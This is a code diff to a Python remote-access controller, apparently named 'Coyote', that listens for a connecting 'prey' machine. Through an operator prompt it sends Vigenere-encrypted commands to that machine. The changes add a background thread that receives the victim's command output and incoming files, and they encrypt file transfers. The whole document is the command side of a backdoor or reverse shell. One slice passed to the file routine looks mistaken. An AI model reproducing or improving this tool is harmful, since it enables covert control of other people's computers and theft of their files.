@@ -2,6 +2,7 @@
 from socket import socket, AF_INET, SOCK_STREAM
 from crypt import Vigenere as v
 from optparse import OptionParser as op
+from threading import Thread 
 from time import sleep
 from os import system
 from sys import argv
@@ -15,6 +16,7 @@ class Coyote:
         self.sock = socket(AF_INET, SOCK_STREAM);
         self.sock.bind(('0.0.0.0', port));
         self.sock.listen(1);
+        self.hearing = True;
         if(defaulthearing):
             if(printing):
                 print("Waiting for prey");
@@ -23,6 +25,10 @@ class Coyote:
             if(printing):
                 print("They prey has connected");
     def shell(self):
+        print("Hearing prey.");
+        ears = Thread(target=self.hear_prey);
+        ears.daemon = True;
+        ears.start();
         cmd = "";
         while cmd != "exit":
             cmd = input(">>>");
@@ -33,13 +39,27 @@ class Coyote:
             elif cmd == "cls":
                 system("cls");
             else:
-                self.send(cmd, encrypt=False);
-                self.recv(decrypt=False, b=2048);
+                self.send(cmd);
         self.conn.close();
 
-    def send(self, msj, encrypt=True):
+    def hear_prey(self):
+        while(self.hearing):
+            msj = self.recv(b=2048, prnt=False);
+            if(msj == 0):
+                continue;
+            if(msj[:2] == "**"):
+                self.getFile(msj[:3]);
+            else:
+                print(msj);
+                print("\n>>>");
+
+
+
+    def send(self, msj, encrypt=True, prnt=False):
         if(encrypt):
             msj = self.v.encrypt(msj);
+        if(prnt):
+            print(msj);
         if(type(msj) != type(b"byte")):
             msj = str(msj).encode();
         self.conn.send(msj);
@@ -62,7 +82,7 @@ class Coyote:
         except FileNotFoundError:
             print("File not found.");
         else:
-            self.send(content, encrypt=False );
+            self.send(content, encrypt=True);
     def recv(self, prnt = True, decode = True, decrypt = True, b=1024):
         try:
             msj = self.conn.recv(b);
